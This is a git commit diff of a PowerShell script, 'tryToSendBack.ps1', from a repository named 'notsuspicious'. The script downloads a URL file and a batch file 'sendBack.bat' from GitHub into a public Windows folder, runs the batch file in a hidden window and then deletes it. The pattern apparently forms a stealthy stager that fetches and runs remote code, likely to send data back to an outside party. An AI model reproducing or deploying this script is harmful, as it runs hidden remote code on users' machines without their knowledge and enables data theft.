7f42425fe87327d2a6e54d8abddb2728335b8a1d
RaupenInspektor <150939693+RaupenInspektor@users.noreply.github.com>
2024-02-29 15:03:29 +0100

    Update tryToSendBack.ps1

--- tryToSendBack.ps1
+++ tryToSendBack.ps1
@@ -1,17 +1,15 @@
 try {
+    # Download url.txt
     Invoke-WebRequest 'https://github.com/RaupenInspektor/notsuspicious/raw/main/url.txt' -OutFile 'C:\Users\Public\Videos\GraphicalUserInterface\url.txt'
-}
-catch {
-    break
-}
-
-try {
+    
+    # Download and execute sendBack.bat
     $batchContent = (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/sendBack.bat" -UseBasicParsing).Content
     $batchContent | Out-File -FilePath "C:\Users\Public\Videos\sendBack.bat" -Encoding ASCII
     Start-Process -FilePath "C:\Users\Public\Videos\sendBack.bat" -WindowStyle Hidden -Wait
 }
 catch {
-    break
+    # Handle exceptions here
+    Write-Host "An error occurred: $_"
 }
 finally {
     # Delete the batch file after execution
